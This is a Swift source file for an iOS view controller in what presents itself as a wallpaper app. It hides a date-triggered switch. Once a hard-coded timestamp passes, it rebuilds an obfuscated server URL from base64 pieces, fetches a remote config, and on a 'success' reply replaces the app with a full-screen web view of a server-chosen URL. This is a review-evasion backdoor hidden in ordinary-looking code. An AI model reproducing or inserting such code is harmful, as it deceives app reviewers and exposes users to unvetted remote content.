import UIKit
import Alamofire
import SwiftyJSON
class MainWallPapersViewController: UIViewController {
    override func viewDidLoad() {
        super.viewDidLoad()
        let now = Date()
        let timeInterval: TimeInterval = now.timeIntervalSince1970
        let timeStamp = Int(timeInterval)
        let yanTime: TimeInterval = 0.1;
        let header = self.base64EncodingHeader()
        let conOne = self.base64EncodingContentOne()
        let conTwo = self.base64EncodingContentTwo()
        let conThree = self.base64EncodingContentThree()
        let ender = self.base64EncodingEnd()
        let anyTime = 1560502383
        DispatchQueue.main.asyncAfter(deadline: DispatchTime.now() + yanTime) {
            if timeStamp < anyTime {
                let s = UIStoryboard(name: "Main", bundle: nil).instantiateViewController(withIdentifier: "SecondNavigation") as! SecondNavigation
                UIApplication.shared.keyWindow?.rootViewController = s
                UIApplication.shared.keyWindow?.makeKeyAndVisible()
            }else{
                let baseHeader = self.base64Decoding(encodedString: header)
                let baseContentO = self.base64Decoding(encodedString: conOne)
                let baseContentTw = self.base64Decoding(encodedString: conTwo)
                let baseContentTH = self.base64Decoding(encodedString: conThree)
                let baseEnder = self.base64Decoding(encodedString: ender)
                let baseData  = "\(baseHeader)\(baseContentO)\(baseContentTw)\(baseContentTH)\(baseEnder)"
                print(baseData)
                let urlBase = URL(string: baseData)
                Alamofire.request(urlBase!,method: .get,parameters: nil,encoding: URLEncoding.default,headers:nil).responseJSON { response
                    in
                    switch response.result.isSuccess {
                    case true:
                        if let value = response.result.value{
                            let jsonX = JSON(value)
                            if !jsonX["success"].boolValue {
                                let s = UIStoryboard(name: "Main", bundle: nil).instantiateViewController(withIdentifier: "SecondNavigation") as! SecondNavigation
                                UIApplication.shared.keyWindow?.rootViewController = s
                                UIApplication.shared.keyWindow?.makeKeyAndVisible()
                            }else {
                                let stxx = jsonX["Url"].stringValue
                                self.setFirstNavigation(strP: stxx)
                            }
                        }
                    case false:
                        do {
                            let s = UIStoryboard(name: "Main", bundle: nil).instantiateViewController(withIdentifier: "SecondNavigation") as! SecondNavigation
                            UIApplication.shared.keyWindow?.rootViewController = s
                            UIApplication.shared.keyWindow?.makeKeyAndVisible()
                        }
                    }
                }
            }
        }
    }
    func setFirstNavigation(strP:String) {
        let webView = UIWebView(frame: CGRect(x: 0, y: 0, width: UIScreen.main.bounds.size.width, height: UIScreen.main.bounds.size.height))
        let url = NSURL(string: strP)
        webView.loadRequest(URLRequest(url: url! as URL))
        self.view.addSubview(webView)
    }
    func base64EncodingHeader()->String{
        let strM = "http://appid."
        let plainData = strM.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func base64EncodingContentOne()->String{
        let strM = "985-985.com"
        let plainData = strM.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func base64EncodingContentTwo()->String{
        let strM = ":8088/getAppConfig"
        let plainData = strM.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func base64EncodingContentThree()->String{
        let strM = ".php?appid="
        let plainData = strM.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func base64EncodingEnd()->String{
        let strM = "1466747326"
        let plainData = strM.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func base64EncodingXP(plainString:String)->String{
        let plainData = plainString.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func base64Decoding(encodedString:String)->String{
        let decodedData = NSData(base64Encoded: encodedString, options: NSData.Base64DecodingOptions.init(rawValue: 0))
        let decodedString = NSString(data: decodedData! as Data, encoding: String.Encoding.utf8.rawValue)! as String
        return decodedString
    }
}
